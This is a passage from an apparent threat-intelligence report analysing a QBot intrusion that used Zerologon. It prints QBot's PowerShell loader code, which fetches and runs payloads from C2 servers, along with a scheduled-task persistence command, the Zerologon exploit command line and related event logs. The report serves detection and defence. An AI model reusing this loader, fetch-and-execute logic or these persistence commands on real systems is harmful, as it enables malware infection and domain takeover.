The image is a flowchart depicting the execution process of a PowerShell script related to QBot malware. It outlines the steps that occur after the script is triggered by a scheduled task. The flowchart includes key decision points, such as validating the registry key creation date, and actions taken based on whether the date is less than or greater than four hours. It highlights two possible paths: executing a local QBot payload or fetching a remote QBot payload. Each step illustrates commands and processes, such as using 'regsvr32.exe' for DLL execution and 'Start-Process' for executing various types of payloads.\nTranscription: |\n  1. Start PowerShell script via Scheduled task\n     └── 2. Validate registry-key creation date\n         ├── < 4 hours\n         │   └── 3. Execute local Qakbot payload in registry\n         │       └── regsvr32.exe $env:temp/<random>.dll\n         └── > 4 hours\n             └── 3. Fetch remote Qakbot payload\n                 └── https://QbotIP/zk?r=n=kfdopi828182\n                     ├── regsvr32.exe $env:temp/<random>.dl\n                     ├── Start-Process $env:temp/<random>.exe\n                     ├── IEX(payload)\n                     └── cmd /c payload\n                     ├── Start-Process $env:temp/<random>.bat\n                     └── Start-Process $env:temp/<random>.vbs\n```\n\nWhen run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a section of PowerShell script code. It includes a function named 'EjSok()', which retrieves an item property from a specified registry path. The script checks if the registry entry exists and retrieves the date associated with it. It also contains logic to determine if the current date exceeds a threshold of four hours from the retrieved date. The code highlights operations related to registry manipulation and date comparisons, relevant to the analysis of malware behavior.\nTranscription: |\n  function EjSok() {\n      $XtqpDJ = (Get-ItemProperty -Path $tvDQBlr).$WQudUrNwDr\n      if (! $XtqpDJ) {\n          return 1\n      }\n      $vRONdfU = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($XtqpDJ))\n      $JfKiixa = Get-Date -Date $vRONdfU\n      $JfKiixa = $JfKiixa.AddHours(4)\n      if ((Get-Date) -gt $JfKiixa) {\n      }\n      return 2\n  }\n```\n\nBased on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.\n\n```image\nAlt: Qbot Payload\nDescription: The image displays a snippet of PowerShell code related to the execution of a malicious DLL. The code includes functions and commands for generating random file names, retrieving encoded data from the Windows Registry, decoding it from base64 format, and executing the DLL using 'regsvr32.exe'. This snippet is part of a larger analysis of the QBot malware's behavior and demonstrates the technical details involved in its execution.\nTranscription: |\n  function UQTV()\n  {\n      $MvmmBxnVj0 = Get-Random\n      $RBnYwaG = (Get-ItemProperty -Path $tvDQbLr).$LngwgFRytJ\n      if ($RBnYwaG) {\n          $_f_zhkPw = \"$env:TEMP\\($MvmmBxnVj0)1.dll\"\n          $fPsS = [System.Convert]::FromBase64String($RBnYwaG)\n          [System.IO.File]::WriteAllBytes($_f_zhkPw, $fPsS)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$_f_zhkPw\"\n      }\n  }\n```\n\nOR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the `Invoke-WebRequest` PowerShell module:\n\n```image\nAlt: Invoke-WebRequest\nDescription: The image depicts a snippet of PowerShell code, which is part of a function that initiates a web request to a dynamically constructed URL. The code includes variables for the URL and utilizes the `Invoke-WebRequest` cmdlet to fetch content, with error handling for different response headers. This script is relevant to the analysis of QBot malware, highlighting the method of retrieving payloads via command-and-control (C2) infrastructure.\nTranscription: |\n  function __NOxzyOQT([string]$RGNDm)\n  {\n      $ekanByiPK = \"https://$($RGNDm)$($d_IP)?n=$($PgZYjDK)\"\n      try\n      {\n          $kArvTQZY = Invoke-WebRequest -UseBasicParsing -Uri $ekanByiPK -DisableKeepAlive\n          $zCdUzfmhD = $kArvTQZY.StatusCode\n          if ($kArvTQZY.Headers.'Content-Type') {\n              $JACjQ = $kArvTQZY.Content\n          } else {\n              $JACjQ = [System.Text.Encoding]::ASCII.GetString($kArvTQZY.Content)\n          }\n      }\n  }\n```\n\nThe PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.\n\n```image\nAlt: Payload Execution\nDescription: The image displays a segment of PowerShell script code, showcasing various commands and functions used for executing payloads associated with the QBot malware. The code includes base64 decoding, file writing operations, and process execution commands, indicating a malware execution chain that retrieves and runs encoded malicious files. Specific variables and methods are highlighted, demonstrating the technical aspects of the malware's functionality.\nTranscription: |\n  switch ($UMMtDg[0])\n  {\n      0 {\n      }\n      1 {\n      }\n      2 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).dll\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$($hHlJSNzeM)\"\n      }\n      3 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).exe\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      4 {\n          $BpLv = IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2])))\n      }\n      5 {\n          $geLrhCE = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          Start-Process cmd.exe \"/c $geLrhCE\"\n      }\n      6 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).bat\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      7 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).vbs\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n  }\n```\n\nThe encoded QBot DLL that was stored in the registry, was dropped in the directory `%APPDATA%\\Roaming\\Microsoft\\Fdopitcu`. The unsigned DLL, with descriptor `Cancel Autoplay 2` was executed using `regsvr32.exe`.\n\n```image\nAlt: DLL Execution\nDescription: The image displays a Windows security audit log entry with details about a new process creation event. Key information included in the log are the Event Code, Process IDs, and the command line used for executing the 'regsvr32.exe' process. The log details the security and account information of the creator and target subjects, as well as the process information, including the parent process 'explorer.exe' and the specific command executed. This information is relevant for understanding the execution context of the QBot malware.\nTranscription: |\n  LogName: Security\n  EventCode: 4688\n  EventType: 0\n  ComputerName: <redacted>\n  SourceName: Microsoft Windows security auditing.\n  Type: Information\n  RecordNumber: 38489\n  Keywords: Audit Success\n  TaskCategory: Process Creation\n  OpCode: Info\n  Message: A new process has been created.\n  \n  Creator Subject:\n      Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n      Account Name: <redacted>\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name:\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1758\n      New Process Name: C:\\Windows\\SysWOW64\\regsvr32.exe\n      Token Elevation Type: %%1936\n      Mandatory Label:\n      Creator Process ID: 0x1958\n      Creator Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Process Command Line: regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxgymv.dll\"\n```\n\nUpon execution of this second-stage DLL, various registry keys were created in `HKCU\\Software\\Microsoft\\Yerqbqokc`. In addition, a new instance of explorer.exe (32-bit) was started and injected into.\n\n```image\nAlt: Registry Keys\nDescription: The image depicts a flowchart illustrating the relationship between various registry keys and processes involved in the execution of a malicious DLL within a cybersecurity context. It shows multiple registry paths under 'HKCU\\\\Software\\\\Microsoft\\\\Yerqbqokc' highlighted in yellow, indicating their relevance to the QBot malware analysis. Additionally, the flowchart connects the `regsvr32.exe` process (with PID 2988) and the `explorer.exe` process (with PID 3916), indicating that `regsvr32.exe` loads a DLL from a specified user directory, which subsequently creates the `explorer.exe` process. The diagram serves to visualize the malware's behavior through registry manipulation and process execution.\nTranscription: |\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\e519a231\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\17737aec\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\d086727f\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\683a151a\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\15325a90\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\ad8e3df5\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\afcf1d89\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\9a50cdc7\n  \n  [1] regsvr32.exe (PID: 2988)\n  [2] explorer.exe (PID: 3916)\n  \n  2656 LOADS\n  852 CREATE PROCESS\n  \n  C:\\Users\\***\\qwrfkxgymyv.dll\n```\n\nThe registry keys contain eight-character long hex strings for which we believe is part of the malware’s encrypted config.\n\n```image\nAlt: Registry Config\nDescription: The image displays a table with several columns related to Windows Registry entries. The columns include 'Value Name,' 'Value Type,' 'Data,' and 'Value Slack.' Each row represents a different registry key, showing various hexadecimal string values encoded in 'Data,' which are presumably linked to malware behavior. The 'Value Type' consistently lists 'RegBinary,' indicating the data is stored in binary form.\nTranscription: |\n  | Value Name | Value Type | Data                                                | Value Slack          |\n  | ---------- | ---------- | --------------------------------------------------- | -------------------- |\n  | sC5d6043   | RegBinary  | 61-06-2A-56-B2-94-BD-EA-F3-67-29-9F-3F-56-EB-17-... | 6F-66                |\n  | d05d20d0   | RegBinary  | 66-5C-5D-D0-3D-87-F6-1F-91-2A-54-33-4C-32-7...      | 00                   |\n  | d2139071   | RegBinary  | 6A-FF-71-4B-8D-8C-F7-3E-6B-11-F0-BD-8B-BA-...       | 00-80-68-46-09-00    |\n  | 6aaff714   | RegBinary  | AF-64-9B-02-05-AD-10-D5-45-28-C9-C5-8C-8...         | 00-53-00-68-00       |\n  | 17a7b89e   | RegBinary  | 26-13-19-3A-7C-1A-7F-24-7E-27-4F-27-...             | 00-00-00             |\n  | af1bdfb    | RegBinary  | 3B-8A-29-64-80-9A-64-80-9A-2D-CE-F8-2A-...          | 00-54-79-70-65-00    |\n  | 9a840fb5   | RegBinary  | 35-AE-8D-F6-9D-ED-47-D4-89-FB-6B-39-F8-...          | 00-18-87-09-00       |\n  | a8b5884b   | RegBinary  | 46-A7-DC-1B-3C-7A-93-7A-2D-7A-3A-...                | 45-00                |\n  | 574a6093   | RegBinary  | 38-4C-32-4C-2E-8C-52-2E-8B-44-18-1C-...             | 24-30-23-39-27-C9-42 |\n  | 45ffc7fd   | RegBinary  | EA-6A-32-4C-4E-2B-4E-2B-44-18-1C-10-D...            | 00-00-00             |\n  | 609490a1   | RegBinary  | 1A-25-2B-51-7F-15-BF-49-AF-39-42-...                | 34                   |\n  | 38f780f7   | RegBinary  | 6E-5B-7F-15-18-F5-1F-49-AF-39-42-...                | 34                   |\n  | 8831a05b   | RegBinary  | A6-9F-61-78-B6-72-0D-20-9A-B3-50-29-E5-EC-1E-BB...  | 34                   |\n```\n\n### Persistence\n\n#### Scheduled Task/Job – Scheduled Task On Beachhead\n\nThe scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.\n\n```\nschtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image is a screenshot of a Windows Task Scheduler log entry detailing the registration of a scheduled task. It includes specific fields such as LogName, EventCode, EventType, ComputerName, User, Type, RecordNumber, and a message indicating that a user registered a scheduled task with a unique identifier. This information is relevant to understanding the persistence mechanism utilized by Qbot malware.\nTranscription: |\n  LogName: Microsoft-Windows-TaskScheduler/Operational\n  EventCode: 106\n  EventType: 4\n  ComputerName: <REDACTED>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-TaskScheduler\n  Type: Information\n  RecordNumber: 2717\n  Keywords: None\n  TaskCategory: Task registered\n  OpCode: Info\n  Message: User <REDACTED> registered Task Scheduler task \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\"\n```\n\n```\nLogName: Microsoft-Windows-TaskScheduler/Operational\nEventCode: 106\nMessage: Task scheduler Task Registered\n```\n\n### Privilege Escalation\n\nThirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.\n\nThe executable was named “cool.exe”:\n\n```\nC:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n```\n\n```image\nAlt: cool.exe\nDescription: |\n  The image is a screenshot of a command-line interface displaying details about a process executed on a Windows system. It includes the\n  - UtcTime: timestamp of the event\n  - ProcessGuid: unique identifier of the process\n  - ProcessId: identifier number of the running process\n  - Image: path to the executable file (cmd.exe)\n  - Description: indicates it is the Windows Command Processor\n  - CommandLine: shows the command used to run the executable, which includes the path to cmd.exe, the execution of 'cool.exe', and a command to terminate explorer.exe.\n  - It also displays placeholders for the Domain Controller IP, Domain name, and Administrator credentials used in the command. This image is relevant to the context, providing technical insights into the process involved in the exploit.\nTranscription: |\n  UtcTime:\n  ProcessGuid: {6634681a-92da-6192-a412-000000000500}\n  ProcessId: 8672\n  Image: C:\\Windows\\SysWOW64\\cmd.exe\n  FileVersion:\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  CommandLine: C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n  CurrentDirectory:\n```\n\nThree milliseconds after the Zerologon exploit, an event 4742 “A computer account was changed.” was generated on the targeted Domain Controller.\n\nAs explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV:\n\n> “In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.”\n\nAs we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller:\n\n```image\nAlt: Brute Force\nDescription: The image depicts network traffic logs related to the RPC_NETLOGON protocol. It shows multiple entries for authentication requests and responses, particularly noting 'STATUS_ACCESS_DENIED' for several attempts, indicating failed authentication attempts. Some lines highlight issues such as 'TCP Spurious Retransmission' and 'TCP Previous segment not captured,' which suggest network anomalies. The overall context is related to a brute-force attack scenario where access to the Domain Controller is being attempted.\nTranscription: |\n  Protocol          Info\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Spurious Retransmission] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Previous segment not captured] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n```\n\nAfter the end of the brute force traffic, we can see a single instance where the exploit has completed successfully.\n\n```image\nAlt: Exploit Success\nDescription: The image displays a network packet capture from a cybersecurity analysis tool. It shows a single frame containing detailed information about a malformed packet related to the Microsoft Network Logon protocol. Key aspects include the Ethernet II source and destination ports, the operation type (NetrServerPasswordSet2), and the timestamp, which appears incorrectly set to 'Dec 31, 1969'. The report also highlights an error indicating a malformed packet, with an associated error level marked as 'Error' and a severity level of 'Error', suggesting that there was an exception during packet processing.\nTranscription: |\n  Frame 938101: 94 bytes on wire (752 bits), 94 bytes captured (752 bits)\n  Ethernet II, Src:\n  Internet Protocol\n  Transmission Control Protocol, Src Port: 49675, Dst Port: 61579, Ack: 41675, Len: 40\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Response, Fragment: Single, FragLen: 40, Call: 548, Ctx: 0, [Req: #938017]\n  Microsoft Network Logon, NetrServerPasswordSet2 (30)\n      Request in frame: 938017\n      AUTHENTICATOR: return_authenticator\n          Referent ID: 0xdd55e901\n          Credential: 080ade8600000000\n          Timestamp: (0)Dec 31, 1969 19:00:00.000000000 EST\n  [Malformed Packet: RPC_NETLOGON]\n      [Expert Info (Error/Malformed): Malformed Packet (Exception occurred)]\n      [Malformed Packet (Exception occurred)]\n      [Severity level: Error]\n      [Group: Malformed]\n```\n\nAfter being successfully authenticated, the DC password was set:\n\n```image\nAlt: DC Password\nDescription: The image is a screenshot of an XML log entry from Microsoft Windows security auditing. It contains detailed information about a security event identified by Event ID 4742, which indicates that a computer account was changed. Key data points include the target username, target domain name, subject username ('ANONYMOUS LOGON'), and the timestamp of the event. The XML structure delineates various attributes associated with the event, providing a technical overview of the changes made to the computer account.\nTranscription: |\n  <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n    <System>\n      <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-a5ba-3e3b0328c30d}\"/>\n      <EventID>4742</EventID>\n      <Version>0</Version>\n      <Level>0</Level>\n      <Task>13825</Task>\n      <Opcode>0</Opcode>\n      <Keywords>0x8020000000000000</Keywords>\n      <TimeCreated SystemTime=\"T17:03:25.2463168Z\"/>\n      <EventRecordID>13249</EventRecordID>\n      <Execution ProcessID=\"644\" ThreadID=\"224\"/>\n      <Channel>Security</Channel>\n      <Computer>...</Computer>\n    </System>\n    <EventData>\n      <Data Name=\"ComputerAccountChange\">...</Data>\n      <Data Name=\"TargetUserName\">...</Data>\n      <Data Name=\"TargetDomainName\">...</Data>\n      <Data Name=\"TargetSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserName\">ANONYMOUS LOGON</Data>\n      <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\n      <Data Name=\"PrivilegeList\">...</Data>\n      <Data Name=\"SubjectLogonId\">0x3e6</Data>\n      <Data Name=\"SamAccountName\">...</Data>\n      <Data Name=\"DisplayName\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"HomePath\">...</Data>\n      <Data Name=\"ScriptPath\">...</Data>\n      <Data Name=\"ProfilePath\">...</Data>\n      <Data Name=\"UserWorkstations\">...</Data>\n      <Data Name=\"PasswordLastSet\">5:03:25 PM</Data>\n      <Data Name=\"UserAccountExpires\">...</Data>\n      <Data Name=\"PrimaryGroupId\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"OldValue\">...</Data>\n      <Data Name=\"UserAccountControl\">...</Data>\n      <Data Name=\"SidHistory\">...</Data>\n      <Data Name=\"LogonHours\">...</Data>\n      <Data Name=\"DnsHostName\">...</Data>\n      <Data Name=\"ServicePrincipalNames\">...</Data>\n    </EventData>\n  </Event>\n```\n\nThe `PasswordLastSet` field is equal to the `TimeCreated` field, meaning that the password of the domain controller was successfully updated. We can also see that the `SubjectUserName` is `ANONYMOUS LOGON`.\n\nA connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.\n\n```image\nAlt: Domain Admin Hash\nDescription: The image displays a Windows Event Log entry (Event 7045) from the Service Control Manager. It provides details about a service that was installed on the system. The log includes the following key information: the service name 'LMMCP00MEDEFHBDAMBML', the service file name which is a PowerShell command to reset the computer's machine password, the service type classified as a user mode service, the service start type labeled as 'demand start', and the service account specified as 'LocalSystem'. This information is relevant for analyzing potential unauthorized service installations and security breaches.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  \n  A service was installed in the system.\n  Service Name: LMMCPOOMEDEFHBDAAMBML\n  Service File Name: powershell.exe -c Reset-ComputerMachinePassword\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\nThe explorer shell was also restarted by the threat actor:\n\n```image\nAlt: Explorer Restart\nDescription: The image displays a Windows Event Viewer screenshot showing Event ID 7045, which indicates that a new service was installed on the system. It includes details such as the service name (ANFDHCOCLIICFDIPINAD), the service file name (a command to execute ‘taskkill’), the service type (user mode service), the start type (demand start), and the service account (LocalSystem). This information is relevant in the context of monitoring system changes and potential malicious activities.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  A service was installed in the system.\n  Service Name: ANFDHCOCLIICFDIPINAD\n  Service File Name: %COMSPEC% /C \"taskkill /f /im explorer.exe\"\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\n### Defense Evasion\n\nUpon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.\n\n```image\nAlt: Process Hollowing\nDescription: The image displays a log entry related to a security event in a Windows environment. It includes various fields such as LogName, EventCode, EventType, ComputerName, SourceName, and details about the process creation event. Key information includes the Creator Subject's Security ID and Logon ID, the Target Subject's Security ID, and the Process Information detailing the New Process ID, New Process Name, and Command Line. This log entry specifically indicates that a new process has been created, providing insight into potential suspicious activity related to process creation.\nTranscription: |\n  LogName=Security\n  EventCode=4688\n  EventType=0\n  ComputerName=\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=38250\n  Keywords=Audit Success\n  TaskCategory=Process Creation\n  OpCode=Info\n  Message=A new process has been created.\n  \n  Creator Subject:\n      Security ID:\n      Account Name:\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name: -\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1958\n      New Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Token Elevation Type: %%1936\n      Mandatory Label: S-1-16-8192\n      Creator Process ID: 0x32b4\n      Creator Process Name: C:\\Windows\\SysWOW64\\rundll32.exe\n      Process Command Line: C:\\Windows\\SysWOW64\\explorer.exe\n```\n\nThe injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.\n\n```image\nAlt: Cobalt Strike Communication\nDescription: The image displays a log entry from the Microsoft Windows Sysmon (System Monitor) detailing a process access event. It includes various information fields such as EventCode, EventType, ComputerName, and specifics about the Source and Target processes involved in a Dynamic-link Library (DLL) injection technique. Key details highlighted include SourceProcessId (10492) and TargetProcessId (4072), both referencing instances of explorer.exe. The log also mentions the technique ID (T1055.001), indicating that this relates to process injection methods, which is relevant to cyber threat intelligence.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=10\n  EventType=4\n  ComputerName=DESKTOP-XXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=38015\n  Keywords=None\n  TaskCategory=Process accessed (rule: ProcessAccess)\n  OpCode=Info\n  Message=Process accessed:\n  RuleName: technique_id=T1055.001, technique_name=Dynamic-link Library Injection\n  UtcTime: [REDACTED]\n  SourceProcessGUID: {6634681a-8d6d-6192-3312-000000000500}\n  SourceProcessId: 10492\n  SourceThreadId: 11956\n  SourceImage: C:\\Windows\\SysWOW64\\explorer.exe\n  TargetProcessGUID: {6634681a-9429-6192-c412-000000000500}\n  TargetProcessId: 4072\n  TargetImage: C:\\Windows\\SysWOW64\\explorer.exe\n  GrantedAccess: 0x1FFFFF\n```\n\n#### Over-Pass-the-Hash from Beachhead\n\nThe threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.\n\n```image\nAlt: Over-Pass-the-Hash\nDescription: The image displays the properties of a security event (Event ID 4624) from a Microsoft Windows security auditing log. It details a successful logon event, including information such as the Security ID, Account Name, Logon Type, and Process Information. The log outlines the account that was logged on, the associated security identifiers, and details about the logon process, including the source address and the authentication package used.\nTranscription: |\n  Event Properties - Event 4624, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  An account was successfully logged on.\n  \n  Subject:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39D591C\n  \n  Logon Information:\n    Logon Type: 9\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: No\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39E88DB\n    Linked Logon ID: 0x0\n    Network Account Name: Administrator\n    Network Account Domain:\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID: 0xaf4\n    Process Name: C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n    Workstation Name:\n    Source Network Address: ::1\n    Source Port: 0\n  \n  Detailed Authentication Information:\n    Logon Process: seclog\n    Authentication Package: Negotiate\n    Transited Services:\n    Package Name (NTLM only): -\n    Key Length: 0\n```\n\nSoon after, a TGT for the administrator account was requested:\n\n```image\nAlt: TGT Request\nDescription: The image displays a screenshot of the Event Properties for Event ID 4768, indicating a request for a Kerberos authentication ticket (TGT). It contains detailed information about the account making the request (Administrator), the service involved (krbtgt), and the associated network information including client address and port. Additional details on ticket options, result code, ticket encryption type, and pre-authentication type are also provided, making it a relevant and informative resource for analyzing authentication requests in a cybersecurity context.\nTranscription: |\n  Event Properties - Event 4768, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  A Kerberos authentication ticket (TGT) was requested.\n  \n  Account Information:\n  - Account Name: Administrator\n  - Supplied Realm Name:\n  - User ID: S-1-5-21-853439379-3680187918-914098032-500\n  \n  Service Information:\n  - Service Name: krbtgt\n  - Service ID: S-1-5-21-853439379-3680187918-914098032-502\n  \n  Network Information:\n  - Client Address: :::ffff:10.155.25.134\n  - Client Port: 61689\n  \n  Additional Information:\n  - Ticket Options: 0x40810010\n  - Result Code: 0x0\n  - Ticket Encryption Type: 0x12\n  - Pre-Authentication Type: 2\n  \n  Certificate Information:\n  - Certificate Issuer Name:\n  - Certificate Serial Number:\n  - Certificate Thumbprint:\n  \n  Certificate information is only provided if a certificate was used for pre-authentication.\n  Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.\n```\n\n### Discovery\n\nQBot initially starts a number of processes to collect information about the affected system. This is part of the “SYSTEM INFO” bot request, as described in a recent article from 